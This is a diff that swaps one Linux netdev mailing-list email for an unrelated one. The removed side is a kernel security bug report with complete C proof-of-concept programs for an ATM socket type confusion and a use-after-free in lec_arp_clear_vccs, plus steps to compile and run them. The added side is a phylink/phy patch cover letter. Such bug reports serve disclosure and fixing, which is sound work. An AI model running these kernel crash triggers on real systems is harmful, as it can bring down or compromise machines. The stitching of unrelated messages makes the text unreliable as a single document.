@@ -2,257 +2,135 @@ Return-Path: <netdev-owner@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
 Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
-	by mail.lfdr.de (Postfix) with ESMTP id 51D811BA461
-	for <lists+netdev@lfdr.de>; Mon, 27 Apr 2020 15:15:46 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id 844161BA491
+	for <lists+netdev@lfdr.de>; Mon, 27 Apr 2020 15:25:18 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1727115AbgD0NPn (ORCPT <rfc822;lists+netdev@lfdr.de>);
-        Mon, 27 Apr 2020 09:15:43 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:50862 "EHLO
-        lindbergh.monkeyblade.net" rhost-flags-OK-FAIL-OK-FAIL)
-        by vger.kernel.org with ESMTP id S1726651AbgD0NPn (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Mon, 27 Apr 2020 09:15:43 -0400
-Received: from mail-lj1-x230.google.com (mail-lj1-x230.google.com [IPv6:2a00:1450:4864:20::230])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 3DD40C0610D5
-        for <netdev@vger.kernel.org>; Mon, 27 Apr 2020 06:15:43 -0700 (PDT)
-Received: by mail-lj1-x230.google.com with SMTP id a21so14626581ljj.11
-        for <netdev@vger.kernel.org>; Mon, 27 Apr 2020 06:15:43 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=mime-version:from:date:message-id:subject:to;
-        bh=Fnbb10p6haOueOHhUxWs+o9mlpt1dqSAGFhXz3/TdwA=;
-        b=l9XrC0Cpqpg3v3lMdykO2vEzb2q7vHvmuQbsfdJJchF7pSLCWajHWdWjgPRWKd/Qfg
-         4F6Iu/E3X0igmwcTv83D5rzOPuhM9urxvEU53tJPEguQVot5E73KA0IJKQAetvAHGByG
-         rtCl4ScUP9GR5VsEgnCVhz3zvMNqIZROBFTbSZRqhWQ6LVv4t+7SpOM9yE2fcw8JKA4/
-         6S/WQRwbEF7i1sYeGtxVIIURrbb5UI6XCbqRe97soOyEgmaTi83oAYl+XK6yfQHGIstw
-         4nsUhbgesDJARcbPPLlwE96v1kY7GTpDzs44xCIt5ieCfg3pmxJYut5GybksC1DNqWaN
-         8ToA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=Fnbb10p6haOueOHhUxWs+o9mlpt1dqSAGFhXz3/TdwA=;
-        b=hR9WMTbb1dduYXkYMGo0pbi9ZJD3qXAq+140aKHCj30XJ7uTxYG0FigH9M9l4vLp+b
-         IFokdLTPpYN1lNzS4vBFkBKTlCNU9fZL9cs+JPNasNOG47+8vk7e5C6HupToSfxBajMV
-         Aek8F74Fz/toVFm+YCFakYeVic2F0g/YO5MTZ3RBc9wqseih25xiFaiEJQW+h+WHt6z9
-         Zu5Pl6gdpqwzHdogri0DzcKCssGkrXsEUz732Zd39Bf18bF6kVLqfPG9tIwrVY1Ro3QR
-         0vJv45XqKRZxphEmm2YwZ35uk8Gldecj0pKqdzPZ31FQWVHqC6Tu/OlrxJACcubJxHiZ
-         ZBOA==
-X-Gm-Message-State: AGi0PuaSox9tZ30qbmFAGmQ++g3rTUnP6BUT4YSzXT1UFqZ+fk1icUJr
-        gGzrT6EWXtTtcagBA3ZOvAvIDYHWaeaDFFZJYJpI6acY
-X-Google-Smtp-Source: APiQypJ11vVdc0YRegS5jTFVFB+DMhwJoEm6+WaJKFcu2mHduSbFq/v4qxPU9jlpuQqqhA738dIqFI6DJmo7brnplPo=
-X-Received: by 2002:a2e:9c13:: with SMTP id s19mr13504971lji.5.1587993340624;
- Mon, 27 Apr 2020 06:15:40 -0700 (PDT)
+        id S1727817AbgD0NZI (ORCPT <rfc822;lists+netdev@lfdr.de>);
+        Mon, 27 Apr 2020 09:25:08 -0400
+Received: from mail-db8eur05on2049.outbound.protection.outlook.com ([40.107.20.49]:33848
+        "EHLO EUR05-DB8-obe.outbound.protection.outlook.com"
+        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
+        id S1727006AbgD0NZD (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Mon, 27 Apr 2020 09:25:03 -0400
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
+ b=ZYlbO6xOhdFkNrpHAwMpNJpzorz5nt6ZpJxUwltO8+R7IrpMYkE7+hsYJ5hijvEBu4dk9d43wnxIa3NXj5Arv6iLmOP96zcTSGMyzloWt35Q9rGupAq1Bbrr8dzXloAAQ4ImqjIKXfIQEkWNHz80RfaSjgeThHGP3HTwlfI8l/XJSv50HTxlKDgj1zH3iQChf52H9/vUiIG5NI/F7X+n8j39C0XEhiCyKGpEJnVwJLymb0dVkSv7E8m231ZgqWR3eYzjy9Vo3WIvJsxMSZ6hUDSGJd9TOZpawVPN0uuGmG+AAhPuKGEiERXnVZwtZuqcDRmajv1yeheAl6NWK0y6Gw==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector9901;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=QDIISntgPyNzQgq2M7Zk7hxiN0ad+WOU/OJG37zmS/A=;
+ b=I/DMPM0HxCAWtVh3xFzVFez5bUEi2+Q9+oZxOFfdge6M16tX+duGGBDiLm5LbZs7reTAVSlIDiMOcY4jehEKuTeWp3jh/W4jy0v6ktkKUG1EIY4y2voZWsFWv7vc6VquWnBtmZYOydI1CcB05WGfh7qGNJ96xKwroPRrkI5lRM72znx5AWAhv+o8PgAMOfZy+NDETuHbqfXMMVpype+cpWFV5+o3ElOTPSiZzNA9JK9rGu9SnFtUfuDupG9DC7DS3w7NiAMRkxzVLvahPRsJYfLSFId0oHNDp5Dn/enlSEuYBWuw4wagO9abc9fGTPTjHAa6CQWEw1suOnxnLrk7zA==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=oss.nxp.com; dmarc=pass action=none header.from=oss.nxp.com;
+ dkim=pass header.d=oss.nxp.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=NXP1.onmicrosoft.com;
+ s=selector2-NXP1-onmicrosoft-com;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=QDIISntgPyNzQgq2M7Zk7hxiN0ad+WOU/OJG37zmS/A=;
+ b=ipZNpZk3tHvNcdk2NaH/TIXYS63x/lW04Zf26XrYy9mdc6692Gp/6bMTndFuxjtk8YJVCBKaml2eorMR2IVSFz8KatqcIOBKvETGI32ir/iNEo7YUT7d0Ckk+coMbux341oIZw9rL1kPt1lDe1seGW1BhO6k1vBdchukJqwOMfI=
+Authentication-Results: spf=none (sender IP is )
+ smtp.mailfrom=calvin.johnson@oss.nxp.com; 
+Received: from AM0PR04MB5636.eurprd04.prod.outlook.com (2603:10a6:208:130::22)
+ by AM0PR04MB6867.eurprd04.prod.outlook.com (2603:10a6:208:182::11) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.2937.13; Mon, 27 Apr
+ 2020 13:25:00 +0000
+Received: from AM0PR04MB5636.eurprd04.prod.outlook.com
+ ([fe80::c4fe:d4a4:f0e1:a75b]) by AM0PR04MB5636.eurprd04.prod.outlook.com
+ ([fe80::c4fe:d4a4:f0e1:a75b%4]) with mapi id 15.20.2937.020; Mon, 27 Apr 2020
+ 13:25:00 +0000
+From:   Calvin Johnson <calvin.johnson@oss.nxp.com>
+To:     linux.cj@gmail.com, Jeremy Linton <jeremy.linton@arm.com>,
+        Andrew Lunn <andrew@lunn.ch>,
+        Andy Shevchenko <andy.shevchenko@gmail.com>,
+        Florian Fainelli <f.fainelli@gmail.com>,
+        Russell King - ARM Linux admin <linux@armlinux.org.uk>,
+        Cristi Sovaiala <cristian.sovaiala@nxp.com>,
+        Florin Laurentiu Chiculita <florinlaurentiu.chiculita@nxp.com>,
+        Ioana Ciornei <ioana.ciornei@nxp.com>,
+        Madalin Bucur <madalin.bucur@oss.nxp.com>,
+        Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
+        Heikki Krogerus <heikki.krogerus@linux.intel.com>
+Cc:     linux-arm-kernel@lists.infradead.org, netdev@vger.kernel.org,
+        Diana Madalina Craciun <diana.craciun@nxp.com>,
+        Laurentiu Tudor <laurentiu.tudor@nxp.com>,
+        linux-acpi@vger.kernel.org, Marcin Wojtas <mw@semihalf.com>,
+        Makarand Pawagi <makarand.pawagi@nxp.com>,
+        "Rajesh V . Bikkina" <rajesh.bikkina@nxp.com>,
+        Varun Sethi <V.Sethi@nxp.com>, linux-kernel@vger.kernel.org,
+        Pankaj Bansal <pankaj.bansal@nxp.com>,
+        Calvin Johnson <calvin.johnson@oss.nxp.com>,
+        "David S. Miller" <davem@davemloft.net>,
+        Heiner Kallweit <hkallweit1@gmail.com>
+Subject: [net-next PATCH v2 0/3] Introduce new APIs to support phylink and phy layers
+Date:   Mon, 27 Apr 2020 18:54:06 +0530
+Message-Id: <20200427132409.23664-1-calvin.johnson@oss.nxp.com>
+X-Mailer: git-send-email 2.17.1
+Content-Type: text/plain
+X-ClientProxiedBy: SG2PR04CA0191.apcprd04.prod.outlook.com
+ (2603:1096:4:14::29) To AM0PR04MB5636.eurprd04.prod.outlook.com
+ (2603:10a6:208:130::22)
 MIME-Version: 1.0
-From:   Gengming Liu <l.dmxcsnsbh@gmail.com>
-Date:   Mon, 27 Apr 2020 21:15:29 +0800
-Message-ID: <CAEn12o7mwN3CT_=kv7NHho7fz-E8jeJfM99ZWD4JVL2E_wm-6g@mail.gmail.com>
-Subject: Two bugs report
-To:     netdev@vger.kernel.org
-Content-Type: text/plain; charset="UTF-8"
+X-MS-Exchange-MessageSentRepresentingType: 1
+Received: from lsv03152.swis.in-blr01.nxp.com (14.142.151.118) by SG2PR04CA0191.apcprd04.prod.outlook.com (2603:1096:4:14::29) with Microsoft SMTP Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.2937.13 via Frontend Transport; Mon, 27 Apr 2020 13:24:54 +0000
+X-Mailer: git-send-email 2.17.1
+X-Originating-IP: [14.142.151.118]
+X-MS-PublicTrafficType: Email
+X-MS-Office365-Filtering-HT: Tenant
+X-MS-Office365-Filtering-Correlation-Id: cd8988b9-ab13-4b9a-387d-08d7eaae62db
+X-MS-TrafficTypeDiagnostic: AM0PR04MB6867:|AM0PR04MB6867:
+X-MS-Exchange-SharedMailbox-RoutingAgent-Processed: True
+X-MS-Exchange-Transport-Forked: True
+X-Microsoft-Antispam-PRVS: <AM0PR04MB6867441ACB343811412D5661D2AF0@AM0PR04MB6867.eurprd04.prod.outlook.com>
+X-MS-Oob-TLC-OOBClassifiers: OLM:2657;
+X-Forefront-PRVS: 0386B406AA
+X-Forefront-Antispam-Report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:AM0PR04MB5636.eurprd04.prod.outlook.com;PTR:;CAT:NONE;SFTY:;SFS:(4636009)(346002)(376002)(396003)(366004)(136003)(39860400002)(86362001)(8936002)(44832011)(2906002)(478600001)(66476007)(81156014)(66556008)(5660300002)(1076003)(66946007)(8676002)(4744005)(26005)(7416002)(6506007)(2616005)(956004)(6512007)(4326008)(16526019)(110136005)(52116002)(6486002)(186003)(6666004)(316002)(1006002)(54906003)(55236004)(110426005)(921003);DIR:OUT;SFP:1101;
+Received-SPF: None (protection.outlook.com: oss.nxp.com does not designate
+ permitted sender hosts)
+X-MS-Exchange-SenderADCheck: 1
+X-Microsoft-Antispam: BCL:0;
+X-Microsoft-Antispam-Message-Info: NDNHAPl3W0Y+ELkgbNJbW/pdUKrXaezvgBTPYndcuif2ut/3m+fUixanR+Lwmx0E0t6VrulkEZU2WszVJM72hQysPwO0XGq3KdCclsQ5BzACmTZULxfgEtLf3oiHza4uGXIj0JT3YF3nQ/SVhh84EL7nIxh5TLdkj4EUYOujxaKzANv36N2L70gLI+hQOIeU9KaI8a7icn1CcR1LhHpl9GSDZvF/6cP81ibCIWLzv0TjOV6z3T8Z/eHfAwyrLhwWocuYfFDk1gVi47Jh/FxNOZfdaeYmoyIb3FsqAjV9FJUxYOycrZwDEAHY/XGnGdQK43DxnPDn5x8FdiQFARU3teC0cCY+PxW8ExlDYV0htHW+Aozt/D6rbrZ2WZbGOavXzNDeZkAmSALKU2UxftvO8I/xR2+KYa6WLvGI9WQPl1AsuGbNTvWf2+kjhveaW/61KOnI+Uy9mg2lcdVmAi/IzRWqQ/e+N8REGs/GQwaPXggtD1GFyOy2tW8cicrDPun/W8TzthmG+Ve6G89PCDWvMA==
+X-MS-Exchange-AntiSpam-MessageData: M/fd8T53+zLaUSE9hJ7btUUIoS836qolxYss4v1byAQwYnemd4v5kBmdLnb3qiJFntb1o3h0uQX5QDWCJrXE0wUfH3zEEsb4+/fr5CATroHX+RyVG01FFkAUnwKQSP1igatf/lt6Q+IbvxQizf9/PDt7llxIFno3P4uYrH3nUAwoeaPv99wA7G7kMJxwV6tjTENQe1O83p9wLEpVUnZYFbedTtVCpx+PNiM32ZIGGpRzL1w9BfzzFJaCB705B1Qr4C2z0ARr8AJdMTbhFKnzyZzhUNBFL/St1hjrR2IT7Y229dKXqdUmZ8toPgWqZ6fNGTySpapkmYO4Ml58jM1kFxmicFmyM4Nl3LTJRBOUcRvfm9z2hgalmib64X6U1RwXxmy05xyyD6FulHEYRIWTnZskMU4T2lq8Rq9GWs9oxsolqmspZiWXDSwaKKqIllKARdPo7o8fVI9JDPv7J2raXNyfIpLyF2Gbvasoj4lwJiVgznPWyXvhHe3rJOqHC1wy4SwSwQITbOe1HwuDiyDhgAkH/l1oQnbqhr+GyqR1QGmfNg23YOh38Yx1whlXfEn+SiW+kMqZk55b9NSw8hCksED4JElL0EDwNeoqfpXZ9VVB+53pkS80yYyorKs3MEadOZvLcxX7AQIeZqOMqrgAoT66rH+YO0n7+y6mFXPdrd36YkC+13T+a9UkI1zOmy81Pm+8C88FAcXdv8LRFoj4VlszJby8JWZKlxFzMAUX1SBh6ac1OL6OeZCUmW5X5phJMDp5Sk8bSXxhV4xbZ2fQ8esFPvga9XM2/r5c1yIvR+g=
+X-OriginatorOrg: oss.nxp.com
+X-MS-Exchange-CrossTenant-Network-Message-Id: cd8988b9-ab13-4b9a-387d-08d7eaae62db
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 27 Apr 2020 13:25:00.3765
+ (UTC)
+X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
+X-MS-Exchange-CrossTenant-Id: 686ea1d3-bc2b-4c6f-a92c-d99c5c301635
+X-MS-Exchange-CrossTenant-MailboxType: HOSTED
+X-MS-Exchange-CrossTenant-UserPrincipalName: 6hJrQTVV2JLew8BHmXlji93FHT7aUTR2HJz9+mFN/sZqa1RrcIK8mEdbA6zNL3RJng7X7mcIYDqRk0jJDFYMcA==
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: AM0PR04MB6867
 Sender: netdev-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <netdev.vger.kernel.org>
 X-Mailing-List: netdev@vger.kernel.org
 
-We found two security bugs in the linux kernel and here's the
-description of the bugs.
+Following functions are defined:
+  phylink_fwnode_phy_connect()
+  phylink_device_phy_connect()
+  fwnode_phy_find_device()
+  device_phy_find_device()
+  fwnode_get_phy_node()
 
-0.Build a testing environment
-  a. Set up Ubuntu 19.04 in Vmware workstation.
-  b. sudo apt install linux-image-5.0.0-21-generic.
-  c. Change the grub default boot entry to 5.0.0-21-generic. (see
-https://askubuntu.com/questions/100232/how-do-i-change-the-grub-boot-order)
-cat /proc/version. If it is as following, it means you succeed.
+First two help in connecting phy to phylink instance.
+Next two help in finding a phy on a mdiobus.
+Last one helps in getting phy_node from a fwnode.
 
-"Linux version 5.0.0-21-generic (buildd@lgw01-amd64-036) (gcc version
-8.3.0 (Ubuntu 8.3.0-6ubuntu1)) #22-Ubuntu SMP Tue Jul 2 13:27:33 UTC
-2019"
+Changes in v2:
+  move phy code from base/property.c to net/phy/phy_device.c
+  replace acpi & of code to get phy-handle with fwnode_find_reference
+  replace of_ and acpi_ code with generic fwnode to get phy-handle.
 
-  d. compile the poc by using gcc.
-  e. Excute poc by "sudo ./poc"
-  f. Use dmesg to check kernel message about crash.
+Calvin Johnson (3):
+  device property: Introduce phy related fwnode functions
+  net: phy: alphabetically sort header includes
+  phylink: Introduce phylink_fwnode_phy_connect()
 
-1.atm_vcc_userback type confusion
+ drivers/net/phy/phy_device.c | 83 ++++++++++++++++++++++++++++++------
+ drivers/net/phy/phylink.c    | 68 +++++++++++++++++++++++++++++
+ include/linux/phy.h          |  3 ++
+ include/linux/phylink.h      |  6 +++
+ 4 files changed, 146 insertions(+), 14 deletions(-)
 
-atm(AF_ATMSVC) socket's vcc->user_back can be treated as different
-types of structures.
+-- 
+2.17.1
 
-To trigger this bug it requires CAP_NET_ADMIN.(Use sudo ./poc)
-
-The PoC has been tested on Linux 5.0.0-21 with Vmware workstation.
-Proc version is:
-Linux version 5.0.0-21-generic (buildd@lgw01-amd64-036) (gcc version
-8.3.0 (Ubuntu 8.3.0-6ubuntu1)) #22-Ubuntu SMP Tue Jul 2 13:27:33 UTC
-2019
-
-Poc:
-#include <linux/socket.h>
-#include <linux/atmdev.h>
-#include <linux/atmarp.h>
-#include <linux/atmlec.h>
-#include <linux/atmsvc.h>
-#include <linux/atmmpc.h>
-#include <linux/atmclip.h>
-
-int main(int argc, char const *argv[])
-{
-int fd;
-fd = socket(0x14,3,0);
-ioctl(fd,0x61d8, 0x17); //ATMMPC_CTRL
-
-unsigned long long arg = 1;
-ioctl(fd, 0x400261f2, &arg ); //ATM_SETBACKEND
-ioctl(fd, 0x61e2, 1 ); //ATMARP_MKIP
-
-char buffer[] =
-"\x21\x26\x27\xc2\xdd\x6e\x1c\x96\x6e\x6b\x1e\xbb\x04\x4f\x0e\x3a\x51\x07\x22\xec\x86\x57";
-setsockopt(fd,0xe0c7, 0x80, buffer,0x16);
-
-return 0;
-}
-
-2.use-after-free in lec_arp_clear_vccs.
-
-UAF object: struct atm_vcc *vcc
-
-vcc is a atm(AF_ATMSVC) socket.
-
-To trigger this bug:
-
-1. Create vcc socket #A and #B
-2. ioctl(ATMLEC_CTRL) to attach #A to lec device.
-3. ioctl(ATMLEC_DATA) to attach #B to device's priv->lec_arp_empty_ones list
-4. close socket #B
-5. close vcc socket #A to call lec_arp_clear_vccs() to trigger UAF
-
-To trigger this bug it requires CAP_NET_ADMIN. (Use sudo ./poc)
-
-The PoC has been tested on Linux 5.0.0-21 with Vmware workstation.
-Proc version is:
-Linux version 5.0.0-21-generic (buildd@lgw01-amd64-036) (gcc version
-8.3.0 (Ubuntu 8.3.0-6ubuntu1)) #22-Ubuntu SMP Tue Jul 2 13:27:33 UTC
-2019
-
-Poc:
-#include <linux/socket.h>
-#include <linux/atmdev.h>
-#include <linux/atmarp.h>
-#include <linux/atmlec.h>
-#include <linux/atmsvc.h>
-#include <linux/atmmpc.h>
-#include <linux/atmclip.h>
-#include <unistd.h>
-#include <sys/syscall.h>
-#include <string.h>
-#include <stdint.h>
-#include <pthread.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <fcntl.h>
-#include <unistd.h>
-
-#include <sys/uio.h>
-#include <signal.h>
- #include <sys/mman.h>
-#include <sys/prctl.h>
-
-#include <sys/inotify.h>
-#include <sys/types.h>          /* See NOTES */
-#include <sys/socket.h>
-
-//#include <linux/wireless.h>
-#include <sys/types.h> /* See NOTES */
-#include <sys/socket.h>
-#include <linux/socket.h>
-#include <sys/un.h>
-#include <stdbool.h>
-#include <netinet/in.h>
-#define SOCK_PORT 10000
-struct my_mmsghdr
-{
-struct msghdr msg_hdr; /* Message header */
-unsigned int msg_len;  /* Number of bytes transmitted */
-};
-
-void *sendmmsg_client_func()
-{
-int sockfd2;
-struct sockaddr_in *paddr;
-char szbuff[2050];
-int ret;
-
-struct sockaddr_in local_addr;
-local_addr.sin_port = htons(SOCK_PORT /*+ getpid()*/);
-local_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
-local_addr.sin_family = AF_INET;
-
-memset(szbuff, 0x2b, 2048);
-
-sockfd2 = socket(AF_INET, SOCK_DGRAM, 0);
-paddr = &local_addr;
-
-while (0 < connect(sockfd2, paddr, sizeof(*paddr)))
-{
-perror("connect");
-usleep(11);
-}
-
-struct msghdr msg;
-struct my_mmsghdr mmsg;
-
-struct iovec vec;
-
-vec.iov_base = szbuff;
-vec.iov_len = 1;
-
-msg.msg_name = paddr;
-msg.msg_namelen = sizeof(*paddr);
-msg.msg_iov = &vec;
-msg.msg_iovlen = 1;
-msg.msg_control = szbuff;
-msg.msg_controllen = 2048;
-msg.msg_flags = 0;
-
-mmsg.msg_hdr = msg;
-mmsg.msg_len = 1;
-
-
-ret = syscall(__NR_sendmmsg, sockfd2, &mmsg, 1, 0);
-if (ret < 0)
-{
-perror("sendmmsg");
-}
-
-}
-void force_loop(){
-/* code */
-int sockB,sockA;
-int dev = 3;
-struct atmlec_ioc ioc_data;
-
-
-sockB = socket(0x14, 0x2, 0x0);
-
-
-sockA = socket(0x14, 0x2, 0x0);
-
-ioctl(sockA, ATMLEC_CTRL, dev);
-
-ioc_data.dev_num = dev;
-ioc_data.receive = 1;
-ioctl(sockB, ATMLEC_DATA, &ioc_data);
-
-close(sockB);
-sendmmsg_client_func();
-
-   close(sockA);
-
-}
-
-
-int main(int argc, char const *argv[])
-{
-force_loop();
-
-
-return 0;
-}
